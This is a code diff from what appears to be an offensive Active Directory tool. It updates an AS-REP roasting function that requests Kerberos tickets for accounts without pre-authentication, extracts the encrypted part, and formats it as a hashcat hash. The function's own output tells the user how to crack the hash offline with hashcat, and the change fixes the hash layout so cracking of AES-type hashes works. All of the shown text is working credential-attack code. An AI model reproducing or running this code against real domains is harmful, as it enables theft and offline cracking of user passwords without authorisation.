@@ -125,37 +125,50 @@ def asrep_roast_user(kdc_ip: str, domain: str, username: str,
     if not resp or resp[0] != 0x6b:  # AS-REP tag
         return None
 
-    extracted = _extract_asrep_encrypted_part(resp)
+    # Phase 61: prefer proper ASN.1 DER parser from kerberos_advanced
+    try:
+        from .kerberos_advanced import (extract_asrep_encrypted_part,
+                                           format_asrep_hashcat,
+                                           hashcat_mode_for_etype,
+                                           etype_name as _etype_name)
+        extracted = extract_asrep_encrypted_part(resp)
+    except ImportError:
+        extracted = _extract_asrep_encrypted_part(resp)
+
     if not extracted:
         return None
 
     etype, cipher = extracted
-    if len(cipher) < 32:
+    if len(cipher) < 24:
         return None
 
-    # hashcat format: $krb5asrep$<etype>$user@DOMAIN:hash1$rest
-    # etype 23 = RC4-HMAC (the typical roastable type)
-    cipher_hex = cipher.hex()
-    # Split: first 16 bytes = checksum, rest = encrypted part
-    if etype == 23:
-        hashcat = (f"$krb5asrep$23${username}@{domain.upper()}:"
-                    f"{cipher_hex[:32]}${cipher_hex[32:]}")
-    elif etype in (17, 18):  # AES
-        hashcat = (f"$krb5asrep${etype}${username}@{domain.upper()}:"
-                    f"{cipher_hex}")
-    else:
-        hashcat = (f"$krb5asrep${etype}${username}@{domain.upper()}:"
-                    f"{cipher_hex}")
+    # Phase 61: use kerberos_advanced.format_asrep_hashcat for correct
+    # per-etype layout (RC4 vs AES checksum positioning). Old code put
+    # AES checksum in the wrong place — broke hashcat -m 19700.
+    try:
+        hashcat = format_asrep_hashcat(username, domain, etype, cipher)
+        mode = hashcat_mode_for_etype(etype, "asrep")
+        ename = _etype_name(etype)
+    except (ValueError, NameError):
+        # Fallback for unsupported etype or import failure
+        cipher_hex = cipher.hex()
+        hashcat = ("$krb5asrep$" + str(etype) + "$" + username + "@"
+                    + domain.upper() + ":" + cipher_hex)
+        mode = 18200 if etype == 23 else 0
+        ename = {23: "RC4-HMAC", 17: "AES128", 18: "AES256"}.get(
+            etype, "etype-" + str(etype)
+        )
+
     return {
         "username": username,
         "domain": domain,
         "etype": etype,
-        "etype_name": {23: "RC4-HMAC", 17: "AES128", 18: "AES256"}.get(etype, "unknown"),
+        "etype_name": ename,
         "hashcat_format": hashcat,
         "cipher_length_bytes": len(cipher),
-        "hashcat_mode": 18200,
-        "note": (f"AS-REP hash extracted. Crack offline with: "
-                 f"hashcat -m 18200 hash.txt wordlist.txt"),
+        "hashcat_mode": mode,
+        "note": ("AS-REP hash extracted. Crack offline with: "
+                 "hashcat -m " + str(mode) + " hash.txt wordlist.txt"),
     }
 
 
